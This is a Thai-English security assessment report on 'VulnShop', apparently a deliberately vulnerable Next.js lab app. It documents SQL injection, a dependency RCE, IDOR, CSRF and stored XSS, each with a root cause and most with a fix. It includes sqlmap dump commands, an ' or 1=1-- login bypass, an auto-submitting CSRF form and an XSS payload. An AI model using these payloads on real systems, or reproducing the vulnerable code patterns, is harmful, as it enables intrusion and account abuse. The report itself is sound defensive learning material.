# _VulnShop Security Assessment Report_

# 1. Vulnerability Summary (สรุปช่องโหว่)

# 2. Detailed Findings (รายละเอียดทางเทคนิค)

## VULN-01: SQL Injection

- **Severity:** **CRITICAL**(CVSS v3.1: 9.8)

- **Location:** src/app/api/login/route.ts

- **Reference:** OWASP Top 10 (2021): A03:2021 – Injection

### Discovery (การค้นพบ)

1. ใช้ Burp Suite เพื่อดัก request เพื่อดูโครงสร้างข้อมูลของ request

2. ใช้ sqlmap ทดสอบ sql injection

**Automated Scan Results:**

```bash



sqlmap  -u  "http://localhost:8888/api/login"  --data='{"username":"test","password":"*"}'  --header="Content-Type: application/json"  --ignore-code=401,400



# ผลลัพธ์: ยืนยันการมีช่องโหว่ และ database ที่ใช้คือ PostgreSQL





sqlmap  -u  "http://localhost:8888/api/login"  --data='{"username":"test","password":"*"}'  --header="Content-Type: application/json"  --dbs



# ผลลัพธ์: พบ 3 DB คือ information_schema, pg_catalog, public





sqlmap  -u  "http://localhost:8888/api/login"  --data='{"username":"test","password":"*"}'  --header="Content-Type: application/json"  -D  public  --dump



# ผลลัพธ์: สามารถดึงข้อมูลทุกตารางจาก public





```

**Steps to Reproduce:**

1. เปิด terminal

2. Run `sqlmap`

```



sqlmap -u "http://localhost:8888/api/login" --data='{"username":"test","password":"*"}' --header="Content-Type: application/json" -D public --dump



```

หรือ

1. เข้าหน้า Login

2. กรอก `' or 1=1--` ในช่องรหัสผ่าน

### Root Cause Analysis (สาเหตุ)

- เพราะ ระบบมีการเอา `username` และ `password` ไปใส่ใน query ของ SQL โดยตรง

ทำให้สามารถใช้สัญลักษณ์พิเศษ เช่น ' หรือ -- เพื่อโจมตีได้

- **Vulnerable Code:**

```javascript
const queryText = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}';`;
```

### Remediation (วิธีการแก้)

- **Fixed Code**

```javascript
const queryText = `SELECT * FROM users WHERE username = $1 AND password = $2;`;

const values = [username, password];
```

- **Reference:** https://github.com/phiraphongph/vulnshop-next/pull/1/files

## VULN-02: RCE in Next.js via React Server Components

- **Severity:** **CRITICAL** (CVSS v3.1: 9.8)

- **Location:** package.json

- **Reference:** CVE-2025-66478

### Discovery (การค้นพบ)

Run Security Pipeline ใน GitHub Action โดยใช้คำสั่ง `npm audit`

**Vulnerability Scan Results:**

```bash



next  15.5.1-canary.0  -  15.5.6



Severity:  critical



Next.js  is  vulnerable  to  RCE  in  React  flight  protocol  -[https://github.com/advisories/GHSA-9qr9-h5gf-34mp](https://github.com/advisories/GHSA-9qr9-h5gf-34mp)



fix  available  via  `npm audit fix --force`



Will  install  next@15.5.7,  which  is  outside  the  stated  dependency  range



node_modules/next





```

**Steps to Reproduce:**

1. เปิด terminal

2. Run คำสั่ง `npm audit` เพื่อดูรายงานช่องโหว่

3. Run คำสั่ง `npm list next` เพื่อดูว่ามีการติดตั้งเวอร์ชั่นที่มีช่องโหว่อยู่

### Root Cause Analysis (สาเหตุ)

โปรเจกต์มีการเรียกใช้ `Next.js` เวอร์ชัน `15.5.1-canary.0` ซึ่งเป็นเวอร์ชันที่มีช่องโหว่ RCE อนุญาตให้ผู้โจมตีรันคำสั่งอันตรายบน Server ได้

**Vulnerable Code:**

```



"dependencies": {



"next": "15.5.4"



}



```

### Remediation (วิธีการแก้)

ทำการอัปเดต Package เป็นเวอร์ชัน `15.5.7` ตามคำแนะนำของ Security Advisory

```bash

npm  install  next@15.5.7  react@latest  react-dom@latest



```

- **Reference:**

https://github.com/phiraphongph/vulnshop-next/pull/3/files

## VULN-03: Insecure Direct Object Reference (IDOR)

- **Severity:** \***\*HIGH\*\*** (CVSS v3.1: 7.1)

- **Location:** src/app/api/buy/route.ts

- **Reference:** **OWASP Top 10 (2021):** A01:2021 – Broken Access Control

### Discovery (การค้นพบ)

- ใช้ Burp Suite เพื่อ intercept request

```json
{
  "productId": 1,

  "quantity": 1,

  "userId": 2
}
```

- พบว่ามีการส่ง `userId` ซึ่งเป็นหมายเลข ID ของผู้ซื้อ

- จึงลองส่ง request ที่เปลี่ยน `userId` พบว่าสามารถสั่งซื้อโดยใช้ยอดเงินของผู้ใช้รายอื่นได้

**PoC Request:**

```json



POST /api/purchase



Content-Type: application/json



{



"productId": 1,



"quantity": 1,



"userId": 2



}



```

**Steps to Reproduce:**

1.Login ด้วยผู้ใช้ user A 2. Intercept request เพื่อแก้ไขค่า `userId` ใน body เป็น 2 3. สังเกตการหักเงินและ response ที่ได้

### Root Cause Analysis (สาเหตุ)

- API รับค่า `userId` จาก request แต่ไม่ได้ตรวจสอบว่าคนส่ง request นั้น มี userId ตรงกับที่ส่งมาใน body

**Vulnerable Code:**

```typescript
userId = typeof body.userId === "number" ? body.userId : 0;
```

### Remediation (วิธีการแก้)

- ตรวจสอบว่า `session.user.id` (จากฝั่ง Server) ตรงกับ `userId` ที่จะทำการแก้ไข/สั่งซื้อ หรือไม่ แทนการรับค่า `userId` จาก Body

## VULN-04: Cross-Site Request Forgery (CSRF)

- **Severity:** **MEDIUM** (CVSS v3.1: 6.5)

- **Location:** src/app/api/buy/route.ts

- **Reference:** OWASP Top 10 (2021): A01:2021 – Broken Access Control

### Discovery (การค้นพบ)

-ใน API ของการสั่งซื้อพบว่ามีการใช้ Cookie การยืนยันตัวตนเพียงอย่างเดียว และไม่มีการใช้ Anti-CSRF Token

**Steps to Reproduce:**

1. ให้เหยื่อ Login เข้าสู่ระบบด้วยบัญชีเหยื่อ

2. สร้างไฟล์ html ใช้หลอกให้เหยื่อกด

3. หลอกให้เหยื่อเปิดไฟล์ขณะ Login อยู่

```html
<!DOCTYPE html>

<html>
  <head>
    <title>csrf_attack.html</title>
  </head>

  <body>
    <h1>กำลังโหลด</h1>

    <form action="http://localhost:8888/api/buy" method="POST" id="hackForm">
      <input type="hidden" name="productId" value="1" />

      <input type="hidden" name="quantity" value="1" />

      <!-- for IDOR attack -->

      <!-- <input type="hidden" name="userId" value="1" /> -->
    </form>

    <script>
      document.getElementById("hackForm").submit();
    </script>
  </body>
</html>
```

### Root Cause Analysis (สาเหตุ)

1. ระบบใช้การแนบ Cookie ไปกับ request ในการยืนยันตัวตนโดยไม่สนใจว่า request นั้น มาจากเว็บที่ถูกต้องหรือไม่

2. ไม่มีการใช้ CSRF Token และไม่ตั้งค่า Samsite ให้เหมาะสม

- **Vulnerable Code:**

```ts
response.cookies.set("session_token", user.username, {
  httpOnly: false,

  path: "/",

  secure: true,

  sameSite: "none",
});
```

### Remediation (วิธีการแก้)

- เว้นไว้ก่อน

- **Reference:**

https://github.com/phiraphongph/vulnshop-next/pull/4/files

## VULN-05: Stored Cross-Site Scripting (XSS)

- **Severity:** **MEDIUM ** (CVSS v3.1: 5.4)

- **Location:** src/app/product/[id]/page.tsx

- **Reference:** OWASP Top 10 (2021): A03:2021 – Injection

### Discovery (การค้นพบ)

- ทดลองกรอก HTML Tag และ JavaScript ลงในช่องคอมเมนต์

- กลับมาดูที่หน้า product ว่า Script กรอกไปว่าทำไหม

**Steps to Reproduce:**

1.Login เข้าสู่ระบบ 2. ไปที่หน้า Product 3. กรอก Payload นี้ในช่อง comment

```



<img src=x onerror=alert("XSS_Hacked")>



```

### Root Cause Analysis (สาเหตุ)

- มีการใช้ `dangerouslySetInnerHTML` โดยไม่มีการ Sanitize ข้อมูลที่กรอกก่อน

**Vulnerable Code:**

```html
<div
  className="text-gray-800 text-lg"
  dangerouslySetInnerHTML="{{"
  __html:
  review.review_content
  }}
/>
```

### Remediation (วิธีการแก้)

- นำ `dangerouslySetInnerHTML` ออก

- **Fixed Code**

```html
<div className="text-gray-800 text-lg">{review.review_content}</div>
```

- **Reference:**

https://github.com/phiraphongph/vulnshop-next/pull/2/files
